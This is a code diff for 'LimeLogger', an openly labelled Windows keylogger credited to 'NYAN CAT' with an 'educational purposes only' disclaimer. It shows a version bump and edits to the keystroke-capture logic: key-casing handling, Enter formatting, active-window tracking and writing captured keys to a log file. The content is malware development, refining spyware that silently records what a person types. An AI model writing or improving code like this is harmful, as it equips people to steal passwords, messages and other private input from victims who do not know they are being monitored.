@@ -7,7 +7,7 @@ using System.Windows.Forms;
 
 
 //       │ Author     : NYAN CAT
-//       │ Name       : LimeLogger v0.2
+//       │ Name       : LimeLogger v0.2.1
 //       │ Contact    : https://github.com/NYAN-x-CAT
 
 //       This program is distributed for educational purposes only.
@@ -45,19 +45,16 @@ namespace LimeLogger
                 string currentKey = null;
                 currentKey = KeyboardLayout((uint)vkCode);
 
-                if ((Keys)vkCode >= Keys.A && (Keys)vkCode <= Keys.Z)
+                if (CapsLock)
                 {
-                    if (CapsLock)
-                    {
-                        currentKey = KeyboardLayout((uint)vkCode).ToUpper();
-                    }
-                    else
-                    {
-                        currentKey = KeyboardLayout((uint)vkCode).ToLower();
-                    }
+                    currentKey = KeyboardLayout((uint)vkCode).ToUpper();
+                }
+                else
+                {
+                    currentKey = KeyboardLayout((uint)vkCode).ToLower();
                 }
 
-                else if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
+                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                     currentKey = "[" + (Keys)vkCode + "]";
 
                 else
@@ -68,7 +65,7 @@ namespace LimeLogger
                             currentKey = "[SPACE]";
                             break;
                         case "Return":
-                            currentKey = "[ENTER]";
+                            currentKey = $"[ENTER]{Environment.NewLine}";
                             break;
                         case "escape":
                             currentKey = "[ESC]";
@@ -104,7 +101,7 @@ namespace LimeLogger
                     }
                 }
 
-                using (StreamWriter sw = new StreamWriter(loggerPath, true))
+                using (StreamWriter sw = new StreamWriter(loggerPath, false))
                 {
                     if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                     {
